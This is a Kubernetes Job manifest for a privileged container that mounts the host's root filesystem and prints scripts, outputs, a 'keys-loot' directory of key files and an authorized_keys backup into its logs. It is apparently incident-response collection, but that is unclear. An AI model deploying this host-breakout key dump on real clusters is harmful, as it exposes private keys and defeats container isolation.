apiVersion: batch/v1
kind: Job
metadata: {name: dump2, namespace: default}
spec:
  backoffLimit: 0
  ttlSecondsAfterFinished: 1800
  template:
    metadata: {labels: {app: dump2}}
    spec:
      restartPolicy: Never
      hostNetwork: true
      containers:
      - name: c
        image: alpine:3.20
        securityContext: {privileged: true}
        volumeMounts:
        - {name: host, mountPath: /host, readOnly: true}
        command: ["/bin/sh","-c"]
        args:
        - |
          for p in /host/root/sucodo-20261126/fm.sh /host/root/sucodo-20261126/fm_sso.sh /host/root/sucodo-20261126/cfgs.txt /host/root/sucodo-20261126/fm.out /host/root/sucodo-20261126/fm_sso.out /host/root/sucodo-20261126/keyfiles.txt; do
            echo "############ $p ############"; cat "$p" 2>/dev/null; echo
          done
          echo "############ keys-loot-rancher5 list ############"; ls -la /host/root/sucodo-20261127/keys-loot-rancher5 2>/dev/null
          for k in /host/root/sucodo-20261127/keys-loot-rancher5/*; do echo "############ KEYFILE $k ############"; cat "$k" 2>/dev/null; echo; done
          echo "############ authkeys backup ############"; cat /host/root/.ssh/authorized_keys.truoc-sucodo-20261126 2>/dev/null
          echo DONE
      volumes:
      - name: host
        hostPath: {path: /}
